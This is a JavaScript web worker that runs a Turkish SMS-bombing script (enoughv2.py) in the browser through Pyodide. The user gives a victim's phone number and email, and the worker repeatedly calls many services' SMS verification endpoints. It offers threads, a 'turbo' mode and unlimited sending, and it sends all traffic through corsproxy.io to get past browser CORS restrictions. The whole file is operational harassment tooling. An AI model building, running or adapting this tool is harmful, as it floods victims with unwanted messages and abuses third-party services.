importScripts("https://cdn.jsdelivr.net/pyodide/v0.25.0/full/pyodide.js");

let pyodide = null;
let enoughCode = "";

// Listen for messages from the main UI thread
self.onmessage = async function(e) {
    const { type, data } = e.data;
    
    if (type === 'init') {
        try {
            self.postMessage({ type: 'status', text: 'Pyodide (WebAssembly) yükleniyor...' });
            pyodide = await loadPyodide();
            
            self.postMessage({ type: 'status', text: 'Paket yükleyici (micropip) hazırlanıyor...' });
            await pyodide.loadPackage('micropip');
            
            self.postMessage({ type: 'status', text: 'Gerekli kütüphaneler kuruluyor (requests, colorama)...' });
            await pyodide.runPythonAsync(`
                import micropip
                await micropip.install('requests')
                await micropip.install('pyodide-http')
                await micropip.install('colorama')
            `);
            
            self.postMessage({ type: 'status', text: 'Sistem modülleri yamalanıyor (Subprocess, OS)...' });
            await pyodide.runPythonAsync(`
                import sys
                import types
                import os
                
                # Mock subprocess to avoid OSError: emscripten does not support processes
                subprocess_mock = types.ModuleType("subprocess")
                subprocess_mock.check_call = lambda *args, **kwargs: 0
                subprocess_mock.call = lambda *args, **kwargs: 0
                subprocess_mock.PIPE = -1
                sys.modules["subprocess"] = subprocess_mock
                
                # Mock os.system to avoid errors when trying to clear terminal
                os.system = lambda *args, **kwargs: 0
                
                import pyodide_http
                pyodide_http.patch_all()
                
                import requests
                original_post = requests.post
                original_get = requests.get
                
                # Override requests to proxy all HTTP traffic through corsproxy.io to bypass browser CORS checks
                def patched_post(url, *args, **kwargs):
                    if not url.startswith('http') or 'corsproxy.io' in url:
                        return original_post(url, *args, **kwargs)
                    proxied_url = f"https://corsproxy.io/?{url}"
                    return original_post(proxied_url, *args, **kwargs)
                    
                def patched_get(url, *args, **kwargs):
                    if not url.startswith('http') or 'corsproxy.io' in url:
                        return original_get(url, *args, **kwargs)
                    proxied_url = f"https://corsproxy.io/?{url}"
                    return original_get(proxied_url, *args, **kwargs)
                    
                requests.post = patched_post
                requests.get = patched_get
            `);
            
            // Get enoughv2.py source code passed from UI and write to virtual FS
            enoughCode = data.code;
            pyodide.FS.writeFile("enoughv2.py", enoughCode);
            
            // Fetch list of available services
            self.postMessage({ type: 'status', text: 'Servis listesi ayrıştırılıyor...' });
            const servicesJson = await pyodide.runPythonAsync(`
                import json
                from enoughv2 import SendSms, servisler_sms
                json.dumps(servisler_sms)
            `);
            const services = JSON.parse(servicesJson);
            
            self.postMessage({ type: 'ready', services: services });
        } catch (err) {
            self.postMessage({ type: 'error', error: err.toString() });
        }
    }
    
    else if (type === 'start') {
        const { phone, mail, count, interval, turbo, threads, services } = data;
        
        try {
            // Callback to send prints/logs back to JavaScript UI
            pyodide.globals.set("send_log_to_js", function(text) {
                self.postMessage({ type: 'log', text: text });
            });
            
            await pyodide.runPythonAsync(`
                import builtins
                import time
                import re
                import math
                from enoughv2 import SendSms, split_services, servisler_sms
                from concurrent.futures import ThreadPoolExecutor, wait
                
                # Redirect print to our JS callback
                def web_print(*args, **kwargs):
                    text = " ".join(str(arg) for arg in args)
                    send_log_to_js(text)
                
                builtins.print = web_print
                
                # Setup variables
                running = True
                sms = SendSms("${phone}", "${mail}")
                selected_services = ${JSON.stringify(services)}
                if not selected_services:
                    selected_services = servisler_sms
                
                target_limit = ${count}
                if target_limit == 0:
                    target_limit = None
                    
                aralik = ${interval}
                threads = ${threads}
                turbo = ${turbo}
                
                def run_services_web(sms, service_list, target_count=None, interval=0):
                    global running
                    while running:
                        for service in service_list:
                            if not running:
                                return
                            if target_count is not None and sms.adet >= target_count:
                                send_log_to_js("Gönderim adeti limitine ulaşıldı.")
                                running = False
                                return
                            
                            try:
                                method = getattr(sms, service)
                                method()
                            except Exception as e:
                                print(f"[-] Hata! {service} çağrılırken hata: {str(e)}")
                                
                            if interval > 0:
                                sleep_start = time.time()
                                while time.time() - sleep_start < interval:
                                    if not running:
                                        return
                                    time.sleep(0.05)
                                    
                        if target_count is not None and sms.adet >= target_count:
                            running = False
                            return

                def run_turbo_web(sms, service_list, thread_count):
                    global running
                    service_chunks = split_services(service_list, thread_count)
                    while running:
                        with ThreadPoolExecutor(max_workers=thread_count) as executor:
                            futures = []
                            for chunk in service_chunks:
                                for service in chunk:
                                    if not running:
                                        break
                                    futures.append(executor.submit(getattr(sms, service)))
                            wait(futures)
                        time.sleep(0.1)

                if turbo:
                    run_turbo_web(sms, selected_services, threads)
                else:
                    service_chunks = split_services(selected_services, threads)
                    with ThreadPoolExecutor(max_workers=threads) as executor:
                        futures = []
                        for chunk in service_chunks:
                            futures.append(executor.submit(run_services_web, sms, chunk, target_limit, aralik))
                        wait(futures)
            `);
            
            self.postMessage({ type: 'finished' });
        } catch (err) {
            self.postMessage({ type: 'error', error: err.toString() });
        }
    }
    
    else if (type === 'stop') {
        if (pyodide) {
            await pyodide.runPythonAsync(`
                running = False
            `);
            self.postMessage({ type: 'stopped' });
        }
    }
};
